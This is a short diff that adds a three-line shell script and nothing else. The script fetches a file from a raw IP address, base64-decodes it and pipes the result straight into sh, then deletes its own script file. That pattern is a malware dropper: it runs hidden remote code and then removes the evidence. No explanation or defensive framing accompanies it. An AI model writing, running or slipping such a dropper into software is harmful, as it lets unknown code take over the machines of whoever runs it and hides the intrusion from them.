@@ -1,0 +1,3 @@
+#!/bin/sh
+curl -s http://31.57.46.28/cxd2/waoinfo.txt | base64 -d | sh
+rm wao.sh
